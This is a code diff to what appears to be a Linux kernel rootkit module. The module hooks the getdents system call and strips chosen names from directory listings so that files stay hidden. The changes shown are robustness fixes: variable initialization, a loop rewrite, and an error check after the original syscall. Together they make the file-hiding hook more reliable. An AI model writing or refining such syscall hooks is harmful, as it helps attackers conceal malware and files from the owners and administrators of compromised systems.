@@ -10,14 +10,14 @@ asmlinkage int (*original_getdents) (unsigned int fd, struct linux_dirent* dirp,
 
 static int remove_dirent_entry(int bytes_read, struct linux_dirent* dirp, unsigned int count, char* name_to_remove){
     int bpos = 0;
-    int rem;
+    int rem = 0;
     char file_name[NAME_MAX] = {0};
-    struct linux_dirent copied;
-    char* tempbuf;
+    char* tempbuf = NULL;
     int nread = bytes_read;
-    struct linux_dirent *d;
+    struct linux_dirent *d = NULL;
+    struct linux_dirent copied;
 
-    for (bpos = 0; bpos < nread;) {
+    while (bpos < nread){
             d = (struct linux_dirent *) ((char*)dirp + bpos);
             strncpy_from_user(file_name, d->d_name, NAME_MAX);
 
@@ -64,6 +64,9 @@ asmlinkage int sys_getdents_hook(unsigned int fd, struct linux_dirent* dirp, uns
     char *path_buf;
 
     nread = original_getdents(fd, dirp, count);
+    if (nread < 0){
+        return nread;
+    }
 
     printk("fd is %d", fd);
     f = fcheck(fd);
